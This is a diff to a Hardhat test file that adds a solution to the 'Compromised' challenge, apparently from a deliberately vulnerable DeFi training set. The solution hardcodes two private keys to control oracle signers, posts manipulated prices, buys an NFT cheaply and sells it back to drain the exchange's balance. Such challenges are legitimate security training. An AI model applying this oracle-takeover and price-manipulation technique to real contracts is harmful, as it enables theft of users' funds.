@@ -1,5 +1,5 @@
 const { expect } = require('chai');
-const { ethers } = require('hardhat');
+const { ethers, utils, keccak256, toUtf8Bytes } = require('hardhat');
 const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
 
 describe('Compromised challenge', function () {
@@ -53,6 +53,26 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const PrivateKeyOne = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
+        let walletOne = new ethers.Wallet(PrivateKeyOne, ethers.provider);
+
+        const PrivateKeyTwo = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
+        let walletTwo = new ethers.Wallet(PrivateKeyTwo, ethers.provider);
+    
+        const tx1 = await oracle.connect(walletOne).postPrice("DVNFT", 0);
+        const tx2 = await oracle.connect(walletTwo).postPrice("DVNFT", 0);
+
+        const buy = await exchange.connect(player).buyOne({ value : ethers.utils.parseEther("0.01")});
+
+        const sellingPrice = await ethers.provider.getBalance(exchange.address);
+
+        const tx3 = await oracle.connect(walletOne).postPrice("DVNFT", sellingPrice);
+        const tx4 = await oracle.connect(walletTwo).postPrice("DVNFT", sellingPrice);
+
+        const approve = await nftToken.connect(player).approve(exchange.address,0);
+        const sell = await exchange.connect(player).sellOne(0);
+
+
     });
 
     after(async function () {
